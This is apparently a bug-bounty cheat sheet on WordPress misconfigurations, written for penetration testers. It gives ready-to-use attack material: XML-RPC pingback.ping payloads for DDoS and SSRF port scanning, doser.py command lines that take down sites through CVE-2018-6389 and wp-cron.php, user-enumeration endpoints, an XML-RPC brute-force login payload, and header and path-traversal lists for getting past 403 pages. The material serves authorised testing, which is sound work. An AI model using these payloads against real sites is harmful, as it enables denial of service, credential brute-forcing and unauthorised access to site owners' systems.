# Wordpress Common Misconfiguration
Here I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well

# Index
* Wordpress Detection
* General Scan Tool
* Admin Panel
* xmlrpc.php
* CVE-2018-6389
* WP Cornjob DOS
* WP User Enumeration
* Bypass 403

# Wordpress Detection
Well, if you are reading this you already know about technology detection tool and methods.
Still adding them below
* Wappalyzer
* WhatRuns
* BuildWith

# Geneal Scan Tool
* [WpScan](https://github.com/wpscanteam/wpscan)
* [WPrecon](https://github.com/blackcrw/wprecon)
* [cms-checker](https://github.com/oways/cms-checker)
* [https://wpsec.com](https://wpsec.com/)


# Admin Panel
If you find admin login panel you must report it in pentest.
On a typical WordPress install, all you need to do is add /login/ or /admin/ to the end of your site URL.

For example:

www.example.com/admin/
www.example.com/login/

If for some reason, your WordPress login URL is not working properly, then you can easily access the WordPress login page by going to this URL:

www.example.com/wp-login.php

Or you can directly access your admin area by entering the website URL like this:

www.example.com/admin/
www.example.com/wp-admin/

### Bypass
* If you cant find admin panel Just go to /wp-admin/install.php and you'll find out where the login page has moved!
* If you got 403 try methods that will explain in "Bypass 403 pages".

# xmlrpc.php 
This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well. <br></br>
what is XMLRPC :  </br>
XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as a transport mechanism.“XML-RPC” also refers generically to the use of XML for remote procedure call, independently of the specific protocol.Basically its a file which can be used for pulling POST data from a website through Remote Procedure Call. </br>

in wordpress its a API which allows developers for doing manipulations in the wordpress site for eg: </br>

Publish a post, Edit a post , Delete a post and even possible to upload some files. </br>

### Detection
* visit site.com/xmlrpc.php
* Get the error message about POST request only

### Exploit
* Intercept the request and change the method GET to POST
* List all Methods
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* Check the ```pingback.ping``` mentod is there or not
* Perform DDOS
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
* Perform SSRF (Internal PORT scan only)
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
    ![xmlrpctossrf](https://user-images.githubusercontent.com/63053441/137260425-a41ced8d-ce2b-4dd3-a98b-a78a0def55f0.jpg)
    
    ![xmlrpctossrf2](https://user-images.githubusercontent.com/63053441/137260444-ae4eaf77-1e0e-43e9-a2b2-6babee48cc75.jpg)



### Tool To Automate XMLRPC-Scan.

[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)

### References
[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)

[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)

# CVE-2018-6389
This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3

### Detection
Use the URL from my gist called loadsxploit, you will get a massive js data in response.

[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)

### Exploit
You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second

[Doser](https://github.com/quitten/doser.py)
```
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
```
### References
[H1 Report](https://hackerone.com/reports/752010)

[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)


# WP Cornjob DOS
This is another area where you can perform a DOS attack.

### Detection
* visit site.com/wp-cron.php
* You will see a Blank page with 200 HTTP status code

### Exploit
You can use the same tool Doser for exploiting this 
```
python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
```
### Reference

[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)

[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)

# WP User Enumeration
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff

### Methods
- CVE-2017-5487 
    - visit site.com/wp-json/wp/v2/users/
    - You will see json data with user info in response
    - if you got 403 error you can use this bypass </br>
    ![wpb](https://user-images.githubusercontent.com/63053441/137262896-0d59a62d-c386-4009-af84-4266b72428b6.png)<br></br>

- /?author=1
    - Increment the number to get more
- User enum with admin panel
    - If you have access to admin panell you can get valid usernames </br>
    ![wpb](https://user-images.githubusercontent.com/63053441/137263541-19c7df14-4ae4-41f7-b5c3-2a438bb05eb1.png)<br></br>



### Exploit
If you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well.</br>
To perform the bruteforce login send the following request in the POST method.</br>
```
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
![image](https://user-images.githubusercontent.com/63053441/137264288-1cd036f8-a002-4409-8b23-ab8833cc6984.png)</br>

I think now you can assume the impact of this vulnerability , it can be used to perform bruteforce attacks for secure credentials and also can automate a major DDOS attack. </br>
Usefull methods:
```
wp.getUserBlogs
wp.getCategories
metaWeblog.getUsersBlogs
```

### Reference
[H1 Report](https://hackerone.com/reports/356047)

# Bypass 403

- X-Rewrite-Url Header is Can be used to bypass WordPress 403 pages.
```
POST /xmlrpc HTTP/1.1        
Host: http://target.com
X-Rewrite-Url: xmlrpc.php
X-Rewrite-Url: wp-json/v2/users
X-Rewrite-Url: wp-login.php
```
- Authorization bypass using .json
![image](https://user-images.githubusercontent.com/63053441/137277282-accb1647-a966-4c91-b319-3f29cfc1381c.png)

    Endpoint bypass paylod list:
    ```
    ?
    ??
    &
    #
    %
    %20
    %09
    /
    /..;/
    ../
    ..%2f
    ..:/
    ../
    \..\.\
    .././
    ..%00/
    ..%0d/
    ..%5c
    ..\
    ..%ff
    %2e%2e%2e%2f
    .%2e/
    %3f
    %26
    %23
    .json
    ```
### Tools
https://github.com/yunemse48/403bypasser
https://github.com/iamj0ker/bypass-403


# Researcher Note
Please do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.

# Author
**Name:** Mehedi Hasan Remon

**Handle:** [@remonsec](https://twitter.com/remonsec)
